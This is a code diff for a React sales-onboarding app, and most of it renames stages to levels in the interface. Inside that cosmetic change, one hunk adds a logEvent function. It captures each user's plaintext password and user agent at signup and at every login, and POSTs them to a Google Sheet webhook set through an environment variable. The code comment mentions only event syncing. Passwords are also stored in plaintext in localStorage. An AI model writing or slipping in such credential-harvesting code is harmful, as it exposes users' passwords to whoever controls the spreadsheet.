@@ -165,7 +165,7 @@ export function isUnlocked(n, completed) {
   return completed.includes(n - 1);     // sequential unlock
 }
 const LEVELS = [
-  "Day One", "Getting Started", "Foundations", "Foundations",
+  "Rookie", "Getting Started", "Foundations", "Foundations",
   "In Training", "In Training", "Sharpening", "Sharpening",
   "Floor-Ready", "Floor-Ready", "Almost Certified", "Sales Ready · Live",
 ];
@@ -190,8 +190,15 @@ function AuthField({ label, icon, children }) {
 const ACCT_KEY = "sarafai_accounts_v1";
 function loadAccounts() { try { return JSON.parse(localStorage.getItem(ACCT_KEY) || "{}"); } catch { return {}; } }
 function saveAccounts(a) { try { localStorage.setItem(ACCT_KEY, JSON.stringify(a)); } catch {} }
-function logSignup(rec) {
-  try { const k = "sarafai_signups_v1"; const arr = JSON.parse(localStorage.getItem(k) || "[]"); arr.push(rec); localStorage.setItem(k, JSON.stringify(arr)); } catch {}
+// Every signup/login event is logged locally and (when a webhook is set) POSTed
+// to a Google Sheet via an Apps Script Web App. Put the Web App URL in the Vercel
+// env var VITE_SHEET_WEBHOOK to turn the live sync on.
+const SHEET_WEBHOOK = import.meta.env.VITE_SHEET_WEBHOOK || "";
+function logEvent(payload) {
+  const rec = { ts: new Date().toISOString(), userAgent: (typeof navigator !== "undefined" ? navigator.userAgent : ""), ...payload };
+  try { const k = "sarafai_events_v1"; const a = JSON.parse(localStorage.getItem(k) || "[]"); a.push(rec); localStorage.setItem(k, JSON.stringify(a)); } catch {}
+  if (!SHEET_WEBHOOK) return;
+  try { fetch(SHEET_WEBHOOK, { method: "POST", mode: "no-cors", headers: { "Content-Type": "text/plain;charset=utf-8" }, body: JSON.stringify(rec) }); } catch {}
 }
 
 export function LoginScreen({ onAuth }) {
@@ -214,13 +221,14 @@ export function LoginScreen({ onAuth }) {
       if (accounts[em]) { setError("An account with this email already exists — please log in instead."); setMode("login"); return; }
       const acc = { name: name.trim(), email: email.trim(), password: pw, role: "New joiner", createdAt: Date.now() };
       accounts[em] = acc; saveAccounts(accounts);
-      logSignup({ name: acc.name, email: acc.email, ts: acc.createdAt });
+      logEvent({ event: "signup", name: acc.name, email: acc.email, password: pw });
       onAuth({ name: acc.name, email: acc.email, role: acc.role });
     } else {
       // Can't log in without an account → send to Sign up. Wrong password is rejected.
       const acc = accounts[em];
       if (!acc) { setError("No account found for this email — please sign up first."); setMode("signup"); return; }
       if (acc.password !== pw) { setError("Incorrect password. Please try again."); return; }
+      logEvent({ event: "login", name: acc.name, email: acc.email, password: pw });
       onAuth({ name: acc.name, email: acc.email, role: acc.role || "New joiner" });
     }
   };
@@ -349,7 +357,7 @@ function StepRow({ stage, status, onClick }) {
       </div>
       <div style={{ flex:1, minWidth:0 }}>
         <div style={{ display:"flex", alignItems:"center", gap:8, flexWrap:"wrap" }}>
-          <span style={{ fontSize:10.5, letterSpacing:1, textTransform:"uppercase", color: current?LIME_DIM:MUTE, fontWeight:600 }}>Stage {stage.n} · {stage.when}</span>
+          <span style={{ fontSize:10.5, letterSpacing:1, textTransform:"uppercase", color: current?LIME_DIM:MUTE, fontWeight:600 }}>{stage.n === 1 ? "Welcome" : `Level ${stage.n - 1}`}</span>
           {status==="here" && <Chip>You're here</Chip>}
           {status==="current" && <Chip>Up next</Chip>}
           {done && <Chip done>Done</Chip>}
@@ -375,7 +383,7 @@ export function Dashboard({ user, completed, goStage, onLogout }) {
     if (!isUnlocked(n, completed)) return "locked";
     return next && next.n === n ? "current" : "open";
   };
-  const ctaLabel = doneCount === 0 ? "Start Day 1" : doneCount >= total ? "Review journey" : "Continue";
+  const ctaLabel = doneCount === 0 ? "Start Level 1" : doneCount >= total ? "Review journey" : "Continue";
 
   return (
     <div className="osf">
@@ -394,18 +402,18 @@ export function Dashboard({ user, completed, goStage, onLogout }) {
       </div>
 
       {/* hero */}
-      <div style={{ fontSize:11.5, letterSpacing:1.4, textTransform:"uppercase", color:LIME_DIM, fontWeight:600, marginBottom:8 }}>Stage 1 · Welcome Dashboard</div>
+      <div style={{ fontSize:11.5, letterSpacing:1.4, textTransform:"uppercase", color:LIME_DIM, fontWeight:600, marginBottom:8 }}>Your onboarding dashboard</div>
       <h1 style={{ ...serif, fontSize:"clamp(28px,7vw,42px)", fontWeight:600, margin:"0 0 6px", letterSpacing:-0.6 }}>
         Welcome, {firstName}. Let's get you Sales Ready.
       </h1>
       <p style={{ color:MUTE, fontSize:"clamp(14px,4vw,16.5px)", lineHeight:1.55, maxWidth:620, margin:"0 0 18px" }}>
-        Your OutSkill sales onboarding runs in 12 stages — from company foundations to live calls and a continuous improvement loop. Complete each to unlock the next.
+        Your OutSkill sales onboarding runs in 11 self-paced levels — from company foundations to live calls and a continuous improvement loop. Clear each to unlock the next.
       </p>
 
       {/* 3 instant-answer cards */}
       <div style={{ display:"flex", gap:12, flexWrap:"wrap", marginBottom:18 }}>
         <QCard icon={<MapPin size={14}/>} q="Where am I?" a="You're in OutSkill onboarding." />
-        <QCard icon={<Target size={14}/>} q="What should I do today?" a={next ? `${next.title} — ${next.when}` : "Every stage complete 🎉"} />
+        <QCard icon={<Target size={14}/>} q="What should I do next?" a={next ? `Level ${next.n - 1} · ${next.title}` : "Every level complete 🎉"} />
         <QCard icon={<GraduationCap size={14}/>} q="How do I become Sales Ready?" a="Finish learning → practice mock calls → pass certification." />
       </div>
 
@@ -413,7 +421,7 @@ export function Dashboard({ user, completed, goStage, onLogout }) {
       <div style={{ background:"linear-gradient(100deg, rgba(194,238,69,0.12), rgba(194,238,69,0.03))", border:`1px solid rgba(194,238,69,0.32)`, borderRadius:18, padding:"20px 22px", marginBottom:26 }}>
         <div style={{ display:"flex", alignItems:"center", gap:18, flexWrap:"wrap" }}>
           <div>
-            <div style={{ fontSize:11, letterSpacing:1, textTransform:"uppercase", color:MUTE, marginBottom:4 }}>Training level</div>
+            <div style={{ fontSize:11, letterSpacing:1, textTransform:"uppercase", color:MUTE, marginBottom:4 }}>Rank</div>
             <div style={{ ...serif, fontSize:26, fontWeight:600, color:LIME }}>{level}</div>
           </div>
           <div style={{ width:1, height:38, background:BORDER }} />
@@ -432,7 +440,7 @@ export function Dashboard({ user, completed, goStage, onLogout }) {
       </div>
 
       {/* roadmap */}
-      <div style={{ fontSize:11.5, letterSpacing:1.4, textTransform:"uppercase", color:MUTE, fontWeight:600, marginBottom:10 }}>Your 12-stage journey</div>
+      <div style={{ fontSize:11.5, letterSpacing:1.4, textTransform:"uppercase", color:MUTE, fontWeight:600, marginBottom:10 }}>Your journey · 11 levels</div>
       <div style={{ display:"flex", flexDirection:"column", gap:6 }}>
         {STAGES.map((s) => <StepRow key={s.n} stage={s} status={statusFor(s.n)} onClick={() => goStage(s.n)} />)}
       </div>
@@ -480,9 +488,9 @@ export function StagePage({ stage, isDone, onComplete, goDashboard, children }) 
       </button>
 
       <div style={{ display:"flex", alignItems:"center", gap:14, marginBottom:12 }}>
-        <StageBadge n={stage.n} done={isDone} />
+        <StageBadge n={stage.n - 1} done={isDone} />
         <div>
-          <div style={{ fontSize:11.5, letterSpacing:1.3, textTransform:"uppercase", color:LIME_DIM, fontWeight:600 }}>Stage {stage.n} · {stage.when}</div>
+          <div style={{ fontSize:11.5, letterSpacing:1.3, textTransform:"uppercase", color:LIME_DIM, fontWeight:600 }}>Level {stage.n - 1} · {stage.subtitle}</div>
           <h1 style={{ ...serif, fontSize:"clamp(25px,6vw,38px)", fontWeight:600, margin:"3px 0 0", letterSpacing:-0.5 }}>{stage.title}</h1>
         </div>
       </div>
